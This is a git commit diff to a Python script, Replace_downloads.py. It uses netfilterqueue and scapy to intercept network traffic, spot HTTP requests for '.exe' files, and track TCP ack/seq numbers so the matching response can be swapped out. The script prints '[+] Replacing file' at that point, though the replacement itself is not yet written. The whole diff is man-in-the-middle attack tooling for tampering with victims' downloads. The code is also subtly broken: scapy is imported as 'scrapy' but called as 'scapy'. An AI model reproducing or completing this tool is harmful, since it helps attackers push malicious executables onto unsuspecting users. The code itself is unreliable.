e2f6cc5de9a334e429d5ce99519f13b84e860deb
Shane Calder <shanescottcalder@gmail.com>
2018-07-23 14:34:33 -0600

    Add files via upload
    added:
    list to store ack and seq from TCP layer
    add ack to list
    check to see if ack is the same as seq
    remove seq from list

--- Replace_downloads.py
+++ Replace_downloads.py
@@ -3,17 +3,21 @@
 import netfilterqueue
 import scapy.all as scrapy
 
+ack_list = []
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            print('HTTP Request')
-            print(scapy_packet.show())
+            if '.exe' in scapy_packet[scapy.Raw].load:
+                print('[+] exe Request')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80:
-            print('HTTP Response')
-            print(scapy_packet.show())
-        print(scapy_packet.show())
-
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print('[+] Replacing file')
+                print(scapy_packet.show())
 
     packet.accept()
 
